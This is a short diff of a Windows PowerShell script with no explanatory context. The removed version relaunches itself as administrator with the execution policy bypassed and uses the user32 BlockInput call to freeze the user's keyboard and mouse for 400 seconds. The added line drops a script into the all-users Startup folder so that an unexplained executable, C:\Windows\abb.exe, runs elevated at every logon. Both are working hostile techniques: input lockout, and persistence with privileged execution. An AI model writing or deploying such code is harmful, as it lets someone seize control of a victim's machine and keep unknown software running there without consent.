@@ -1,17 +1,1 @@
-#Run As Administrator
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
-
-$code = @"
-    [DllImport("user32.dll")]
-    public static extern bool BlockInput(bool fBlockIt);
-"@
-
-$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
-
-function Disable-UserInput($seconds) {
-    $userInput::BlockInput($true)
-    Start-Sleep $seconds
-    $userInput::BlockInput($false)
-}
-
-Disable-UserInput -seconds 400 | Out-Null
+Set-Content -Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\s.ps1" -Value "Start-Process C:\Windows\abb.exe -Verb runAs"
